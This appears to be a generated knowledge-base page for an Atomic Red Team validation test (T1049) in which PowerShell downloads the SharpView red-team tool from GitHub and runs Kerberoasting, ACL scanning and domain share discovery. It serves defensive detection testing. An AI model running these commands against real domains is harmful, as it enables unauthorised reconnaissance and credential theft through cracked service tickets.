---
atomic_guid: "96f974bb-a0da-4d87-a744-ff33e73367e9"
title: "System Discovery using SharpView"
framework: "atomic"
generated: "true"
attack_technique_id: "T1049"
attack_technique_name: "System Network Connections Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "96f974bb-a0da-4d87-a744-ff33e73367e9"
  - "System Discovery using SharpView"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# System Discovery using SharpView

Get a listing of network connections, domains, domain users, and etc.  
sharpview.exe located in the bin folder, an opensource red-team tool.
Upon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.

## Metadata

- Atomic GUID: 96f974bb-a0da-4d87-a744-ff33e73367e9
- Technique: T1049: System Network Connections Discovery
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1049/T1049.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1049-system_network_connections_discovery|T1049]]

## Input Arguments

### SharpView

- description: Path of the executable opensource redteam tool used for the performing this atomic.
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\SharpView.exe

### SharpView_url

- description: sharpview download URL
- type: url
- default: https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true

### syntax

- description: Arguements method used along with SharpView to get listing of network connections, domains, domain users, and etc.
- type: string
- default: "Invoke-ACLScanner", "Invoke-Kerberoast", "Find-DomainShare" 


## Dependencies

Sharpview.exe must exist on disk at specified location (#{SharpView})

### Prerequisite Check

```text
if (Test-Path "#{SharpView}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory (split-path "#{SharpView}") -ErrorAction ignore | Out-Null
Invoke-WebRequest #{SharpView_url} -OutFile "#{SharpView}"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$syntaxList = #{syntax}
foreach ($syntax in $syntaxList) {
#{SharpView} $syntax -}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.yaml)
